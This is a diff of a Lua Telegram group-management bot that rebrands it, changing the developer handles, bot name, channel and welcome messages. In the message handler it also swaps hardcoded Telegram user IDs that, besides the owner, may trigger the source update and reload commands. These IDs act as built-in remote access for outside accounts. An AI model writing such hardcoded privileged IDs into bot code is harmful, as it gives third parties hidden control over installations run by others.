@@ -1,6 +1,6 @@
 
 --[[
-BY @jjjij
+BY @iiiziii
 #---------------------------------------------------------------------
 ]]
 
@@ -80,7 +80,7 @@ boss..":SUDO_ID:",SUDO_USER,
 boss..":DataCenter:","Amsterdam",
 boss..":UserNameBot:",BOT_User,
 boss..":ApiSource","Sourceee6ee",
-boss..":NameBot:","ابو سعد",
+boss..":NameBot:","ارماندو",
 "TH3BOSS_INSTALL","Yes"
 )
 redis:hset(boss..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
@@ -93,7 +93,7 @@ Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
 print('\27[1;36m￤Token.txt is created.\27[m')
-local Text = "اهلين عزيزي [المطور الاساسي](tg://user?id="..SUDO_USER..") \nشكرا لاستخدامك سورس Mishary  \nأرســل الحين /start \nعشان تشوف اوامر المطور  المجهزه بالكيبورد\n\n𓍦"
+local Text = "اهلين عزيزي [المطور الاساسي](tg://user?id="..SUDO_USER..") \nشكرا لاستخدامك سورس آرماندو  \nأرســل الحين /start \nعشان تشوف اوامر المطور  المجهزه بالكيبورد\n\n𓍦"
 https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
 local CmdRun = [[
 rm -f ./README.md
@@ -113,13 +113,13 @@ if not TokenBot then
 print('\27[0;33m>>'..[[
 
 
-مرحباآ بك في سورس ابو سعد
+مرحباآ بك في سورس آرماندو
 
 
 
-قناة السورس @EE6EE
+قناة السورس @rnnni
 
-مطور السورس @jjjij
+مطور السورس @iiiziiii
 ---------------------------------------------------------------------
 ]]..'\027[0;32m')
 create_config()
@@ -149,17 +149,16 @@ if not ok then
 print('\27[31m! Error File Not "Run inc/locks.lua" !\n\27[39m')
 print(tostring(io.popen("lua inc/locks.lua"):read('*all')))
 end
-
 print('\27[0;33m>>'..[[
 
 
-مرحباآ بك في سورس ابو سعد
+مرحباآ بك في سورس ارماندو
 
 
 
-قناة السورس @ee6ee
+قناة السورس @rnnni
 
-مطور السورس @jjjij
+مطور السورس @iiiziiii
 -------------------------------------------------------------------
 
 ]]..'\027[0;32m'
@@ -596,19 +595,19 @@ print("MessageEntityCode")
 end
 end
 msg.text = msg.content_.text_
-if (msg.text=="تحديث" or msg.text=="we" or msg.text=="حدث") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 00090 or msg.sender_user_id_ == 1718587141) then
+if (msg.text=="تحديث" or msg.text=="we" or msg.text=="حدث") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 00090 or msg.sender_user_id_ == 1634560089) then
 return sendMsg(msg.chat_id_,msg.id_," ابشر ",function(arg,data)
 Refresh_Start = true
 end)
 end 
-if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1281716337 or msg.sender_user_id_ == 1718587141) then
+if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1634560089 or msg.sender_user_id_ == 1634560089) then
 UpdateSource(msg)
 sendMsg(msg.chat_id_,msg.id_,'  Done Master   ',function(arg,data)
 dofile("./inc/Run.lua")
 print("Reload ~ ./inc/Run.lua")
 end) 
 end
-if (msg.text == 'reload' or msg.text == "أعادة التشغيل 🔌") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 00090 or msg.sender_user_id_ == 1718587141) then
+if (msg.text == 'reload' or msg.text == "أعادة التشغيل 🔌") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 00090 or msg.sender_user_id_ == 1634560089) then
 sendMsg(msg.chat_id_,msg.id_,'- {* تــم أعـاده تشغيل البوت  *} .\n\n- { Bot is Reloaded » }',function(arg,data)
 dofile("./inc/Run.lua")
 print("Reload ~ ./inc/Run.lua")
